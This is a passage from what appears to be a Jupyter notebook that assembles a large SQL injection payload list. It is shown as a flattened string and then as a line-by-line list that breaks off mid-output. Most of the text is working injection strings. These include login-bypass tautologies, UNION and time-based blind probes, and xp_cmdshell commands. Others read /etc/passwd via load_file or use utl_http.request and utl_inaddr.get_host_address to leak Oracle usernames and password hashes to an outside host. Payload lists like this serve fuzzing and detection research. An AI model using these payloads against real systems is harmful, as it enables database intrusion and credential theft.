\";&\" or 1=1 -- 1   select * from users where id=\\'1\\' union select \";\"_,version() -- 1\\'   select * from users where id=1 or \";@\" or 1=1 -- 1   select * from users where id=1 or \";{\" or 1=1 -- 1   select * from users where id=1 or 1#\"? or 1=1 -- 1   select * from users where id=1 or \"?(\" or 1=1 -- 1   select * from users where id=1 or \"])\" or 1=1 -- 1   select * from users where id=1 or \"?,\" or 1=1 -- 1   select * from users where id=\\'1\\' union select $[\"],@@VERSION -- 1\\'   select * from users where id=1 or \"].\" or 1=1 -- 1   select * from users where id=1 or \"]1\" or 1=1 -- 1  s  select * from users where id=1 or \"?;\" or 1=1 -- 1   select * from users where id=1 or \"??\" or 1=1 -- 1   select * from users where id=1 or 1#\"? union select 1,version() -- 1   select * from users where id=1 or 1#\"? union select version(),version() -- 1   select * from users where id=1 or 1#\"? union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\"? union select null,version() -- 1   select * from users where id=1 or \"?#\" or 1=1 -- 1   select * from users where id=1 or \"?[\" or 1=1 -- 1   select * from users where id=1 or \"?_\" or 1=1 -- 1   select * from users where id=1 or 1#\"?=1 or 1=1 -- 1   select * from users where id=1 or 1#\"?=1 union select 1,version() -- 1   select * from users where id=1 or \"?%\" or 1=1 -- 1   select * from users where id=\\'1\\' union select \"?\"_,version() -- 1\\'   select * from users where id=1 or \"?@\" or 1=1 -- 1   select * from users where id=1 or \"]{\" or 1=1 -- 1   select * from users where id=\\'1\\' union select ||/1,version() -- 1\\'   select * from users where id=\\'1\\' union select (\\\\),@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select (\\\\.),@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select (1),banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\' union select \\\\,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select \\\\.,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select \\\\.#,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select \\\\.%1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select 1,banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\' union select 1a,banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\' union select 1\"!\",banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\' union select \\\\#,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select $ .,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select $ _,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select $*$,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select +\\\\,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select +\\\\.,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select !<1,version() -- 1\\'   select * from users where id=\\'1\\' union select +\\\\#,@@VERSION -- 1\\'   select * from users where id=\\'1\\' union select !<@,version() -- 1\\'   select * from users where id=\\'1\\' union select @ 1,version() --  1\\'   select * from users where id=\\'1\\'   union select null,banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\' union select @ @1,version() --  1\\'   select * from users where id=1 or \"\\\\#\" or 1=1 -- 1   select * from users where id=1 or \"$(\" or 1=1 -- 1   select * from users where id=1 or \"_)\" or 1=1 -- 1   select * from users where id=\\'1\\' union select \"[\"_,version() -- 1\\'  s  select * from users where id=1 or \"_;\" or 1=1 -- 1   select * from users where id=1 or \"$?\" or 1=1 -- 1   select * from users where id=1 or 1#\"$ union select 1,version() -- 1   select * from users where id=1 or 1#\"$ union select version(),version() -- 1   select * from users where id=1 or 1#\"$ union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\"$ union select null,version() -- 1   select * from users where id=1 or \"$#\" or 1=1 -- 1   select * from users where id=1 or \"$[\" or 1=1 -- 1   select * from users where id=1 or \"$_\" or 1=1 -- 1   select * from users where id=1 or \"$&\" or 1=1 -- 1   select * from users where id=1 or \"$@\" or 1=1 -- 1   select * from users where id=1 or \"_{\" or 1=1 -- 1   select * from users where id=\\'1\\' *(\\\\) or 1=1 -- 1\\'   select * from users where id=\\'1\\' + (\\\\) union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' + (\\\\.) union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' *(1) union select 1,banner from v$version where rownum=1 -- 1\\'   select * from users where id=1 or \"&(\" or 1=1 -- 1   select * from users where id=1 or \"&)\" or 1=1 -- 1   select * from users where id=1 or \"%,\" or 1=1 -- 1   select * from users where id=\\'1\\'<@.. or 1=1 -- 1\\'   select * from users where id=\\'1\\'<@.. union select 1,version() -- 1\\'   select * from users where id=\\'1\\' <@.$ or 1=1 -- 1\\'   select * from users where id=\\'1\\' <@._ union select 1,version() -- 1\\'   select * from users where id=1 or \"%.\" or 1=1 -- 1   select * from users where id=\\'1\\' + 1||1 union select 1,banner from v$version where rownum=1 -- 1\\'   select * from users where id=\\'1\\' *1 union select 1,banner from v$version where rownum=1 -- 1\\'   select * from users where id=1 or \"%1\" or 1=1 -- 1  s  select * from users where id=1 or \"%;\" or 1=1 -- 1   select * from users where id=1 or \"%?\" or 1=1 -- 1   select * from users where id=\\'1\\' + @<@# union select 1,version() -- 1\\'   select * from users where id=\\'1\\' *$ . or 1=1 -- 1\\'   select * from users where id=\\'1\\' + $ . union select 1,@@VERSION -- 1\\'   select * from users where id=\\'1\\' *$ 1 or 1=1 -- 1\\'   select * from users where id=1 or \"%[\" or 1=1 -- 1   select * from users where id=\\'1\\' <@$_ or 1=1 -- 1\\'   select * from users where id=\\'1\\' <@$_ union select 1,version() -- 1\\'   select * from users where id=1 or \"%_\" or 1=1 -- 1   select * from users where id=\\'1\\' + $+%\\\\ or 1=1 -- 1\\'   select * from users where id=\\'1\\' <@&1 or 1=1 -- 1\\'   select * from users where id=\\'1\\' <@&1 union select 1,version() -- 1\\'   select * from users where id=\\'1\\' <@<@ union select 1,version() -- 1\\'   select * from users where id=\\'1\\' + $+%$ or 1=1 -- 1\\'   select * from users where id=\\'1\\' + $+*$ union select 1,@@VERSION -- 1\\'   select * from users where id=1 or \"%&\" or 1=1 -- 1   select * from users where id=\\'1\\' <@&@ or 1=1 -- 1\\'   select * from users where id=\\'1\\' %!<@ union select 1,version() -- 1\\'   select * from users where id=\\'1\\'<@$$ union select 1,version() -- 1\\'   select * from users where id=\\'1\\' + @(1) union select 1,version() -- 1\\'   select * from users where id=\\'1\\' + @ 1 union select 1,version() -- 1\\'   select * from users where id=\\'1\\' + @ 1! union select 1,version() -- 1\\'   select * from users where id=\\'1\\' + @ @1 union select 1,version() -- 1\\'   select * from users where id=1 or \"%{\" or 1=1 -- 1   select * from users where id=1 or \"@(\" or 1=1 -- 1   select * from users where id=1 or \"@)\" or 1=1 -- 1  s  select * from users where id=1 or \"@;\"=1 or 1=1 -- 1   select * from users where id=1 or \"@?\" or 1=1 -- 1   select * from users where id=1 or 1#\"@ union select 1,version() -- 1   select * from users where id=1 or 1#\"@ union select version(),version() -- 1   select * from users where id=1 or 1#\"@ union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\"@ union select null,version() -- 1   select * from users where id=1 or \"@#\" or 1=1 -- 1   select * from users where id=1 or \"@%\" or 1=1 -- 1   select * from users where id=1 or \"{(\"=1 or 1=1 -- 1   select * from users where id=1 or \"{)\" or 1=1 -- 1   select * from users where id=1 or \"{,\"=1 or 1=1 -- 1   select * from users where id=1 or \"{.\" or 1=1 -- 1   select * from users where id=1 or \"{1\"=1 or 1=1 -- 1  s  select * from users where id=1 or \"{;\" or 1=1 -- 1   select * from users where id=1 or \"{?\" or 1=1 -- 1   select * from users where id=1 or 1#\"{ union select 1,version() -- 1   select * from users where id=1 or 1#\"{ union select version(),version() -- 1   select * from users where id=1 or 1#\"{ union select \\'a\\',version() -- 1   select * from users where id=1 or 1#\"{ union select null,version() -- 1   select * from users where id=1 or \"{#\" or 1=1 -- 1   select * from users where id=1 or @#\"{=1 or 1=1 -- 1   select * from users where id=1 or @#\"{=1 union select 1,version() -- 1   select * from users where id=1 or \"{%\" or 1=1 -- 1   select * from users where id=1 or \"{@\" or 1=1 -- 1   select * from users where id=1 or \"{{\" or 1=1 -- 1   select * from users where id=1 + @`\\\\` union select 1,version() -- 1   select * from users where id=1 + @<1# union select 1,version() -- 1   select * from users where id=1 + @<@. union select 1,version() -- 1   select * from users where id=1 -@<@ union select 1,version() -- 1   select * from users where id=1 -@<@ union select version(),version() -- 1   select * from users where id=1 -@<@ union select null,version() -- 1   select * from users where id=1 + @<@# union select null,version() -- 1  \\'-\\'  \\' \\'  \\'&\\'  \\'^\\'  \\'*\\'  \\' or \\'\\'-\\'  \\' or \\'\\' \\'  \\' or \\'\\'&\\'  \\' or \\'\\'^\\'  \\' or \\'\\'*\\'  \"-\"  \" \"  \"&\"  \"^\"  \"*\"  \" or \"\"-\"  \" or \"\" \"  \" or \"\"&\"  \" or \"\"^\"  \" or \"\"*\"  or true--  \" or true--  \\' or true--  \") or true--  \\') or true--  \\' or \\'x\\'=\\'x  \\') or (\\'x\\')=(\\'x  \\')) or ((\\'x\\'))=((\\'x  \" or \"x\"=\"x  \") or (\"x\")=(\"x  \")) or ((\"x\"))=((\"x  or 1=1  or 1=1--   or 1=1#  or 1=1/*  admin\\' --  admin\\' #  admin\\'/*  admin\\' or \\'1\\'=\\'1  admin\\' or \\'1\\'=\\'1\\'--  admin\\' or \\'1\\'=\\'1\\'#  admin\\' or \\'1\\'=\\'1\\'/*  admin\\'or 1=1 or \\'\\'=\\'  admin\\' or 1=1  admin\\' or 1=1--  admin\\' or 1=1#  admin\\' or 1=1/*  admin\\') or (\\'1\\'=\\'1  admin\\') or (\\'1\\'=\\'1\\'--  admin\\') or (\\'1\\'=\\'1\\'#  admin\\') or (\\'1\\'=\\'1\\'/*  admin\\') or \\'1\\'=\\'1  admin\\') or \\'1\\'=\\'1\\'--  admin\\') or \\'1\\'=\\'1\\'#  admin\\') or \\'1\\'=\\'1\\'/*  1234 \\' AND 1=0 UNION ALL SELECT \\'admin\\', \\'81dc9bdb52d04dc20036dbd8313ed055  admin\" --  admin\" #  admin\"/*  admin\" or \"1\"=\"1  admin\" or \"1\"=\"1\"--  admin\" or \"1\"=\"1\"#  admin\" or \"1\"=\"1\"/*  admin\"or 1=1 or \"\"=\"  admin\" or 1=1  admin\" or 1=1--  admin\" or 1=1#  admin\" or 1=1/*  admin\") or (\"1\"=\"1  admin\") or (\"1\"=\"1\"--  admin\") or (\"1\"=\"1\"#  admin\") or (\"1\"=\"1\"/*  admin\") or \"1\"=\"1  admin\") or \"1\"=\"1\"--  admin\") or \"1\"=\"1\"#  admin\") or \"1\"=\"1\"/*  1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055  \\'sqlvuln  \\'+sqlvuln  sqlvuln;  (sqlvuln)  a\\' or 1=1--  \"a\"\" or 1=1--\"   or a = a  a\\' or \\'a\\' = \\'a  1 or 1=1  a\\' waitfor delay \\'0:0:10\\'--  1 waitfor delay \\'0:0:10\\'--  declare @q nvarchar (4000) select @q =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A  0  031003000270000  declare @s varchar(22) select @s =  0x77616974666F722064656C61792027303A303A31302700 exec(@s)  0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)  declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e  exec(@s)  a\\'  ?  \\' or 1=1  ‘ or 1=1 --  x\\' AND userid IS NULL; --  x\\' AND email IS NULL; --  anything\\' OR \\'x\\'=\\'x  x\\' AND 1=(SELECT COUNT(*) FROM tabname); --  x\\' AND members.email IS NULL; --  x\\' OR full_name LIKE \\'%Bob%  23 OR 1=1  \\'; exec master..xp_cmdshell \\'ping 172.10.1.255\\'--  \\'  \\'%20or%20\\'\\'=\\'  \\'%20or%20\\'x\\'=\\'x  %20or%20x=x  \\')%20or%20(\\'x\\'=\\'x  0 or 1=1  \\' or 0=0 --  \" or 0=0 --  or 0=0 --  \\' or 0=0 #   or 0=0 #\"  or 0=0 #  \\' or 1=1--  \" or 1=1--  \\' or \\'1\\'=\\'1\\'--  \\' or 1 --\\'  or 1=1--  or%201=1  or%201=1 --  \\' or 1=1 or \\'\\'=\\'   or 1=1 or \"\"=  \\' or a=a--   or a=a  \\') or (\\'a\\'=\\'a  ) or (a=a  hi or a=a  hi or 1=1 --\"  hi\\' or 1=1 --  hi\\' or \\'a\\'=\\'a  hi\\') or (\\'a\\'=\\'a  \"hi\"\") or (\"\"a\"\"=\"\"a\"  \\'hi\\' or \\'x\\'=\\'x\\';  @variable  ,@variable  PRINT  PRINT @@variable  select  insert  as  or  procedure  limit  order by  asc  desc  delete  update  distinct  having  truncate  replace  like  handler  bfilename  \\' or username like \\'%  \\' or uname like \\'%  \\' or userid like \\'%  \\' or uid like \\'%  \\' or user like \\'%  exec xp  exec sp  \\'; exec master..xp_cmdshell  \\'; exec xp_regread  t\\'exec master..xp_cmdshell \\'nslookup www.google.com\\'--  --sp_password  \\\\x27UNION SELECT  \\' UNION SELECT  \\' UNION ALL SELECT  \\' or (EXISTS)  \\' (select top 1  \\'||UTL_HTTP.REQUEST  1;SELECT%20*  to_timestamp_tz  tz_offset  <>\"\\'%;)(&+  \\'%20or%201=1  %27%20or%201=1  %20$(sleep%2050)  %20\\'sleep%2050\\'  char%4039%41%2b%40SELECT  &apos;%20OR  \\'sqlattempt1  (sqlattempt2)  |  %7C  *|  %2A%7C  *(|(mail=*))  %2A%28%7C%28mail%3D%2A%29%29  *(|(objectclass=*))  %2A%28%7C%28objectclass%3D%2A%29%29  (  %28  )  %29  &  %26  !  %21  \\' or 1=1 or \\'\\'=\\'  \\' or \\'\\'=\\'  x\\' or 1=1 or \\'x\\'=\\'y  /  //  //*  */*  a\\' or 3=3--  \"a\"\" or 3=3--\"  \\' or 3=3  ‘ or 3=3 -- )%20or%20(\\'x\\'=\\'x  %20or%201=1  ; execute immediate \\'sel\\' || \\'ect us\\' || \\'er\\'  benchmark(10000000,MD5(1))#  update  \";waitfor delay \\'0:0:__TIME__\\'--  1) or pg_sleep(__TIME__)--  ||(elt(-3+5,bin(15),ord(10),hex(char(45))))  \"hi\"\") or (\"\"a\"\"=\"\"a\"  delete  like  \" or sleep(__TIME__)#  pg_sleep(__TIME__)--  *(|(objectclass=*))  declare @q nvarchar (200) 0x730065006c00650063 ...   or 0=0 #  insert  1) or sleep(__TIME__)#  ) or (\\'a\\'=\\'a  ; exec xp_regread  *|  @var select @var as var into temp end --  1)) or benchmark(10000000,MD5(1))#  asc  (||6)  \"a\"\" or 3=3--\"  \" or benchmark(10000000,MD5(1))#  # from wapiti   or 0=0 --  1 waitfor delay \\'0:0:10\\'--   or \\'a\\'=\\'a  hi or 1=1 --\"  or a = a   UNION ALL SELECT  ) or sleep(__TIME__)=\\'  )) or benchmark(10000000,MD5(1))#  hi\\' or \\'a\\'=\\'a  0  21 %  limit   or 1=1   or 2 > 1  \")) or benchmark(10000000,MD5(1))#  PRINT  hi\\') or (\\'a\\'=\\'a   or 3=3  ));waitfor delay \\'0:0:__TIME__\\'--  a\\' waitfor delay \\'0:0:10\\'--  1;(load_file(char(47,101,116,99,47,112,97,115, ...  or%201=1  1 or sleep(__TIME__)#  or 1=1   and 1 in (select var from temp)--   or \\'7659\\'=\\'7659   or \\'text\\' = n\\'text\\'   --   or 1=1 or \\'\\'=\\'  declare @s varchar (200) select @s = 0x73656c6 ...  exec xp  ; exec master..xp_cmdshell \\'ping 172.10.1.255\\'--  3.10E+17  \" or pg_sleep(__TIME__)--  x\\' AND email IS NULL; --  &  admin\\' or \\'   or \\'unusual\\' = \\'unusual\\'  //  truncate  1) or benchmark(10000000,MD5(1))#  \\\\x27UNION SELECT  declare @s varchar(200) select @s = 0x77616974 ...  tz_offset  sqlvuln  \"));waitfor delay \\'0:0:__TIME__\\'--  ||6  or%201=1 --  %2A%28%7C%28objectclass%3D%2A%29%29  or a=a  ) union select * from information_schema.tables;  PRINT @@variable  or isNULL(1/0) /*  26 %  \" or \"a\"=\"a  (sqlvuln)  x\\' AND members.email IS NULL; --   or 1=1--   and 1=( if((load_file(char(110,46,101,120,11 ...  0x770061006900740066006F0072002000640065006C00 ...  %20\\'sleep%2050\\'  as  1)) or pg_sleep(__TIME__)--  /**/or/**/1/**/=/**/1   union all select @@version--  ,@variable  (sqlattempt2)   or (EXISTS)  t\\'exec master..xp_cmdshell \\'nslookup www.googl ...  %20$(sleep%2050)  1 or benchmark(10000000,MD5(1))#  %20or%20\\'\\'=\\'  ||UTL_HTTP.REQUEST   or pg_sleep(__TIME__)--  hi\\' or \\'x\\'=\\'x\\';  \") or sleep(__TIME__)=\"   or \\'whatever\\' in (\\'whatever\\')  ; begin declare @var varchar(8000) set @var=\\' ...   union select 1,load_file(\\'/etc/passwd\\'),1,1,1;  0x77616974666F722064656C61792027303A303A313027 ...  exec(@s)  ) or pg_sleep(__TIME__)--   union select   or sleep(__TIME__)#   select * from information_schema.tables--  a\\' or 1=1--  a\\' or \\'a\\' = \\'a  declare @s varchar(22) select @s =   or 2 between 1 and 3   or a=a--   or \\'1\\'=\\'1  |   or sleep(__TIME__)=\\'   or 1 --\\'  or 0=0 #\"  having  a\\'  \" or isNULL(1/0) /*  declare @s varchar (8000) select @s = 0x73656c ...  â\\x80\\x98 or 1=1 --  char%4039%41%2b%40SELECT  order by  bfilename   having 1=1--  ) or benchmark(10000000,MD5(1))#   or username like char(37);  ;waitfor delay \\'0:0:__TIME__\\'--  \" or 1=1--  x\\' AND userid IS NULL; --  */*   or \\'text\\' > \\'t\\'   (select top 1   or benchmark(10000000,MD5(1))#  \");waitfor delay \\'0:0:__TIME__\\'--  a\\' or 3=3--   -- &password=   group by userid having 1=1--   or \\'\\'=\\'  ; exec master..xp_cmdshell  %20or%20x=x  select  \")) or sleep(__TIME__)=\"  0x730065006c0065006300740020004000400076006500 ...  hi\\' or 1=1 --  \") or pg_sleep(__TIME__)--  %20or%20\\'x\\'=\\'x   or \\'something\\' = \\'some\\'+\\'thing\\'  exec sp  29 %  (  Ã½ or 1=1 --  1 or pg_sleep(__TIME__)--  0 or 1=1  ) or (a=a  uni/**/on sel/**/ect  replace  %27%20or%201=1  )) or pg_sleep(__TIME__)--  %7C  x\\' AND 1=(SELECT COUNT(*) FROM tabname); --  &apos;%20OR  ; or \\'1\\'=\\'1\\'  declare @q nvarchar (200) select @q = 0x770061 ...  1 or 1=1  ; exec (\\'sel\\' + \\'ect us\\' + \\'er\\')  23 OR 1=1  /  anything\\' OR \\'x\\'=\\'x  declare @q nvarchar (4000) select @q =  or 0=0 --  desc  ||\\'6  )  1)) or sleep(__TIME__)#  or 0=0 #   select name from syscolumns where id = (sele ...  hi or a=a  *(|(mail=*))  password:*/=1--  distinct  );waitfor delay \\'0:0:__TIME__\\'--  to_timestamp_tz  \") or benchmark(10000000,MD5(1))#   UNION SELECT  %2A%28%7C%28mail%3D%2A%29%29  +sqlvuln   or 1=1 /*  )) or sleep(__TIME__)=\\'  or 1=1 or \"\"=   or 1 in (select @@version)--  sqlvuln;   union select * from users where login = char ...  x\\' or 1=1 or \\'x\\'=\\'y  28 %  â\\x80\\x98 or 3=3 --  @variable   or \\'1\\'=\\'1\\'--  \"a\"\" or 1=1--\"  //*  %2A%7C  \" or 0=0 --  \")) or pg_sleep(__TIME__)--  ?   or 1/*  !  \\'   or a = a  declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)  declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)   declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)  declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)  \\' or 1=1  \\x18 or 1=1 --  x\\' OR full_name LIKE \\'%Bob%  \\'; exec master..xp_cmdshell \\'ping 172.10.1.255\\'--  \\'%20or%20\\'\\'=\\'  \\'%20or%20\\'x\\'=\\'x  \\')%20or%20(\\'x\\'=\\'x  \\' or 0=0 --  \\' or 0=0 #   or 0=0 #\"  \\' or 1=1--  \\' or \\'1\\'=\\'1\\'--  \\' or 1 --\\'  or 1=1--  \\' or 1=1 or \\'\\'=\\'   or 1=1 or \"\"=  \\' or a=a--   or a=a  \\') or (\\'a\\'=\\'a  \\'hi\\' or \\'x\\'=\\'x\\';  or  procedure  handler  \\' or username like \\'%  \\' or uname like \\'%  \\' or userid like \\'%  \\' or uid like \\'%  \\' or user like \\'%  \\'; exec master..xp_cmdshell  \\'; exec xp_regread  t\\'exec master..xp_cmdshell \\'nslookup www.google.com\\'--  --sp_password  \\' UNION SELECT  \\' UNION ALL SELECT  \\' or (EXISTS)  \\' (select top 1  \\'||UTL_HTTP.REQUEST  1;SELECT%20*  <>\"\\'%;)(&+  \\'%20or%201=1  \\'sqlattempt1  %28  %29  %26  %21  \\' or \\'\\'=\\'  \\' or 3=3   or 3=3 --   '"
      ]
     },
     "execution_count": 36,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_sqli_data.replace('\\n', ' ')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['a\\n',\n",
       " \"a' \\n\",\n",
       " \"a' --\\n\",\n",
       " \"a' or 1=1; --\\n\",\n",
       " '@\\n',\n",
       " '?\\n',\n",
       " \"' and 1=0) union all\\n\",\n",
       " '? or 1=1 --\\n',\n",
       " \"x' and userid is NULL; --\\n\",\n",
       " \"x' and email is NULL; --\\n\",\n",
       " \"anything' or 'x'='x\\n\",\n",
       " \"x' and 1=(select count(*) from tabname); --\\n\",\n",
       " \"x' and members.email is NULL; --\\n\",\n",
       " \"x' or full_name like '%bob%\\n\",\n",
       " '23 or 1=1; --\\n',\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\\n\",\n",
       " 'a\\n',\n",
       " '1 or 1=1\\n',\n",
       " \"1' or '1'='1\\n\",\n",
       " \"1 and user_name() = 'dbo'\\n\",\n",
       " '1\\n',\n",
       " \"1'1\\n\",\n",
       " '1 exec sp_ (or exec xp_)\\n',\n",
       " '1 and 1=1\\n',\n",
       " \"1' and 1=(select count(*) from tablenames); --\\n\",\n",
       " '1\\n',\n",
       " \"1 and user_name() = 'dbo'\\n\",\n",
       " \"\\\\'; desc users; --\\n\",\n",
       " \"1\\\\'1\\n\",\n",
       " \"1' and non_existant_table = '1\\n\",\n",
       " \"' or username is not NULL or username = '\\n\",\n",
       " \"1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116\\n\",\n",
       " \"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype = 'u' --\\n\",\n",
       " '1 uni/**/on select all from where\\n',\n",
       " '’ or ‘1’=’1\\n',\n",
       " \"' or '1'='1\\n\",\n",
       " \"'||utl_http.request('httP://192.168.1.1/')||'\\n\",\n",
       " \"' || myappadmin.adduser('admin', 'newpass') || '\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i\\n\",\n",
       " \"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i\\n\",\n",
